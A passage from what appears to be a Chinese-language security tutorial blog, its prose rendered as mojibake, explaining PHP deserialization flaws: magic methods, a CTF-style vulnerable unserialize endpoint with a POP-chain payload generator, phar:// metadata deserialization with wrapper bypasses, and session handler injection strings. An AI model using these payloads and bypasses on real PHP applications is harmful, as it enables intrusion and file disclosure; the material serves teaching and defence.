class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220620212404834.png" alt="image-20220620212404834"></p><blockquote><p>å¯ä»¥å‘ç°åºåˆ—åŒ–æ—¶åªä¼šåºåˆ—åŒ–ç±»çš„å±æ€§ï¼Œè€Œä¸ä¼šåºåˆ—åŒ–ç±»çš„æ–¹æ³•ã€‚</p></blockquote><h3 id="ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“"><a href="#ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“" class="headerlink" title="ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“"></a>ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;i:<span class="number">19</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;infoc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä»”ç»†è§‚å¯Ÿä¼šå‘ç°protectedå’Œprivateå˜é‡åºåˆ—åŒ–åå˜é‡åé•¿åº¦å‘ç”Ÿäº†å˜åŒ–</p><ul><li><p>s:4:â€*bâ€;</p></li><li><p>s:7:â€infocâ€</p><p>æˆ‘ä»¬ç”¨010æ‰“å¼€1.txt</p><p><img src="/../images/image-20220714122008106.png" alt="image-20220714122008106"></p></li></ul><p>â€‹å¯ä»¥å‘ç°protectedåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00*%00</p><p>â€‹è€Œprivateåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00ç±»å%00</p><blockquote><p>åœ¨å®é™…è¿ç”¨ä¸­å¯ä»¥ç”¨\00ï¼ˆ<code>ç©º</code>ï¼‰ç”¨%00ä»£æ›¿</p><p>åŸå› ï¼šphpçš„<code>urlencode()</code>ä¼šè‡ªåŠ¨æŠŠ<code>ç©º</code>ç¼–ç æˆ%00</p></blockquote><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: é­”æœ¯æ–¹æ³• - Manual</a></p><h3 id="å¸¸è§"><a href="#å¸¸è§" class="headerlink" title="å¸¸è§"></a>å¸¸è§</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„æ„é€ å‡½æ•°ï¼Œåˆ›å»ºç±»å¯¹è±¡æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç±»çš„ææ„å‡½æ•°ï¼Œå¯¹è±¡é”€æ¯æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨constructå‡½æ•°</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œunserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨destructå‡½æ•°</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="comment">$name: è¢«è°ƒç”¨æ–¹æ³•çš„åå­—</span></span><br><span class="line"><span class="comment">$argumentsï¼šä¼ é€’ç»™è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶</span></span><br><span class="line"><span class="comment">1.è¾“å‡ºå¯¹è±¡ï¼šecho/printç­‰ </span></span><br><span class="line"><span class="comment">2.å‡½æ•°çš„å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œå°†å¯¹è±¡ä½œä¸ºå‚æ•°æ—¶</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br></pre></td></tr></table></figure><ul><li><p>__invoke()</p><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;è§¦å‘äº†ivokeé­”æœ¯æ–¹æ³•&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">#ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;è§¦å‘äº†ivokeé­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure></li><li><p>ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§</p><p>èµ‹å€¼æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è¯»å–æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> æˆ– <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p></li><li><p>å…¶ä»–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set_state</span>()ï¼Œè°ƒç”¨<span class="title function_ invoke__">var_export</span>()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br></pre></td></tr></table></figure></li></ul><h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æœ‰åºåˆ—åŒ–å°±æœ‰ååºåˆ—åŒ–ï¼Œæ¼æ´ç‚¹å°±äº§ç”Ÿäºååºåˆ—åŒ–æ—¶ã€‚</p><p>å› ä¸ºåºåˆ—åŒ–æ•°æ®ä¸­å­˜å‚¨çš„æ˜¯ç±»å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œ<strong>è¦†ç›–å˜é‡</strong>ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ol><li><p>å®šä½åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä»£ç ï¼Œæ‰¾åˆ°å¯æ§å‚æ•°å’Œååºåˆ—åŒ–å¯¹è±¡</p></li><li><p>æ˜ç¡®è¦åˆ©ç”¨çš„æ–¹æ³•å’Œå±æ€§</p></li><li><p>æ ¹æ®å…¶æ‰€åœ¨ç±»çš„é­”æœ¯æ–¹æ³•æ„é€ popé“¾ï¼ˆä¼ å…¥å‚æ•°åˆ°è§¦å‘å…³é”®å‡½æ•°,æ³¨æ„ç±»å±æ€§çš„ç±»å‹ï¼‰</p><p>åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public è¦†ç›–ä¿®é¥°ã€‚</p></li><li><p>ä¼ é€’æ„é€ å¥½çš„åºåˆ—åŒ–å†…å®¹(æœ€å¥½è¦urlencodeä¸€ä¸‹)ï¼Œè§¦å‘ååºåˆ—åŒ–ï¼Œå®Œæˆæ”»å‡»</p></li></ol><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;<span class="comment">//flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›®çš„æ˜¯è¦è§¦å‘ __get() è¿™ä¸ªå‡½æ•°ï¼Œé­”æœ¯æ–¹æ³•__get()ä¼šåœ¨ç”±å¤–éƒ¨è®¿é—®å¯¹è±¡ä¸­çš„ç§æœ‰å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå…¶ä¸­å‚æ•°ä¼ªè®¿é—®å±æ€§çš„å±æ€§åã€‚å†è§‚å¯Ÿexampleè¿™ä¸ªç±»ï¼Œè¿™é‡Œå‘ç° __toStrong() æ–¹æ³•ï¼Œè€Œåˆå­˜åœ¨ <code>echo $a</code> è¿™å¥ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šè¦æ„é€ çš„è¿™ä¸ª $a å°±æ˜¯ exampleè¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œè€Œä¸”è¿™ä¸ªå¯¹è±¡ä¸­çš„å±æ€§ $flag ä¹Ÿåº”ä¸º get è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œä»è€Œ æ‰§è¡Œ <code>return $this-&gt;str-&gt;flag</code>æ—¶å°±ä¼šè·³è½¬åˆ° get å¯¹è±¡çš„ é­”æœ¯æ–¹æ³• __get($name) ï¼ˆ$nameä¸ºè¦è®¿é—®çš„ç§æœ‰å±æ€§çš„åç§°ï¼Œå³ flag è¿™ä¸ªå±æ€§åï¼‰ã€‚ä¹‹åè¦ include <code>&#39;flag.php&#39;</code>ï¼Œç”±äº$name &#x3D;&#x3D; flagï¼Œæ‰€ä»¥è¦æ„é€  $flag &#x3D;&#x3D; â€˜.phpâ€™ ï¼Œæ‹¼æ¥èµ·æ¥å°±å¯ä»¥åŒ…å« â€˜flag.phpâ€™ ä»è€Œæ‹¿åˆ°flagã€‚</p><p>å³</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">example</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">get</span>(<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1 id="pharååºåˆ—åŒ–â€“PHP-lt-8"><a href="#pharååºåˆ—åŒ–â€“PHP-lt-8" class="headerlink" title="pharååºåˆ—åŒ–â€“PHP&lt;8"></a>pharååºåˆ—åŒ–â€“PHP&lt;8</h1><h2 id="pharæ˜¯ä»€ä¹ˆ"><a href="#pharæ˜¯ä»€ä¹ˆ" class="headerlink" title="pharæ˜¯ä»€ä¹ˆ"></a>pharæ˜¯ä»€ä¹ˆ</h2><ol><li><p>åŠŸèƒ½ï¼šå‹ç¼©æ–‡ä»¶ï¼Œå°†å†…å®¹åºåˆ—åŒ–å­˜å‚¨</p></li><li><p>å¦‚ä½•ç”Ÿæˆï¼š</p><blockquote><p>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOff,å¹¶åˆ é™¤å‰é¢çš„;å¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶æ ¼å¼</p><p>ç”¨010æ‰“å¼€ç”Ÿæˆçš„test.pharï¼Œè§‚å¯Ÿpharæ–‡ä»¶çš„å››ä¸ªç»„æˆéƒ¨åˆ†</p></li></ol><p><img src="/../images/image-20220708184054295.png" alt="image-20220708184054295"></p><p>â€‹    å…³æ³¨stubå’Œmanifest</p><p>â€‹stubï¼špharè¯†åˆ«æ ‡å¿—ï¼Œåªè¦æœ‰äº†è¿™ä¸ªè¯†åˆ«æ ‡å¿—ï¼Œ<strong>å³ä½¿åç¼€åä¸ä¸ºpharï¼Œphpä»èƒ½å¤Ÿå°†æ–‡ä»¶è¯†åˆ«ä¸ºpharæ–‡ä»¶</strong></p><p>â€‹manifestï¼šè¿™ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼Œæ˜¯ååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹</p><p>â€‹    signatureï¼šå½“æˆ‘ä»¬éœ€è¦æ”¹å˜pharæ–‡ä»¶å†…å®¹æ—¶ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆç­¾å</p><p>â€‹     </p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><ol><li><p>pharä¸­manifestæ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„</p></li><li><p>phpä¸€å¤§éƒ¨åˆ†çš„<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–</strong>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#test.pharæ˜¯ä¸Šé¢ç”Ÿæˆä»£ç ç”Ÿæˆçš„</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;phar://test.phar&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20220708185428364.png" alt="image-20220708185428364"></p><p>3.å—åˆ°å½±å“çš„å‡½æ•°</p><p>From <a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p><p><img src="/../images/image-20220714125317293.png" alt="image-20220714125317293"></p><p>â€‹</p></li></ol><p></p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ol><li><p>ç»•è¿‡pharå¼€å¤´</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p>ç»•è¿‡pharæ ‡è¯†ç¬¦<code>&lt;?php __HALT_COMPILER(); ?&gt;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip phar.phar #ä½¿ç”¨å‹ç¼©åpharæ–‡ä»¶åŒæ ·ä¹Ÿèƒ½ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure></li><li><p>ç­¾åä¿®æ”¹</p></li></ol><h1 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h1><p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p><h2 id="sessionå·¥ä½œæµç¨‹"><a href="#sessionå·¥ä½œæµç¨‹" class="headerlink" title="sessionå·¥ä½œæµç¨‹"></a>sessionå·¥ä½œæµç¨‹</h2><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1685604427875.png" alt="20191026142328-1fba974c-f7b9-1"></p><h2 id="sessionåºåˆ—åŒ–"><a href="#sessionåºåˆ—åŒ–" class="headerlink" title="sessionåºåˆ—åŒ–"></a>sessionåºåˆ—åŒ–</h2><p><code>PHP session</code>çš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±<code>session.serialize_handler</code>æ¥å®šä¹‰å¼•æ“çš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±<code>sess_sessionid</code>æ¥å†³å®šæ–‡ä»¶åçš„ã€‚</p><blockquote><p>é€šå¸¸æ–‡ä»¶åä¸ºsess_sessionidçš„å½¢å¼ï¼Œé»˜è®¤çš„å¼•æ“æ˜¯php</p></blockquote><p><img src="/../images/image-20220730213222612.png" alt="image-20220730213222612"></p><h2 id="äº§ç”Ÿçš„åŸå› "><a href="#äº§ç”Ÿçš„åŸå› " class="headerlink" title="äº§ç”Ÿçš„åŸå› "></a>äº§ç”Ÿçš„åŸå› </h2><p>sessionåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨åˆ°çš„å¼•æ“ä¸åŒ</p><p>ä¾‹å¦‚</p><ul><li><p>ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œåºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp</p><p>å‡è®¾è¦ä¿å­˜åˆ°sessionçš„æ•°æ®ä¸ºusername&#x3D;khaz</p><ul><li><p>phpæ€ä¹ˆçŸ¥é“è¦ä¿å­˜å“ªäº›æ•°æ®åˆ°sessionä¸­</p><blockquote><p>é€šè¿‡åœ¨$_SESSIONç¯å¢ƒå˜é‡æ³¨å†Œ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°†usernameå˜é‡ä¿å­˜åˆ°sessionä¸­</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>ä¼šè¯ç»“æŸåï¼Œå°†$_SESSIONåºåˆ—åŒ–ä¿å­˜åˆ°sessionæ–‡ä»¶ä¸­ã€‚</p><p>æ­£å¸¸ä¿å­˜</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æ„é€ username&#x3D;|a:1:{s:8:â€passwdâ€;s:4:â€Khazâ€;}</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¬¬äºŒæ¬¡è¯·æ±‚ï¼Œååºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp_serialize</p><p>æ­£å¸¸</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br><span class="line">â†’ <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><p>æ”»å‡»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">â†’ <span 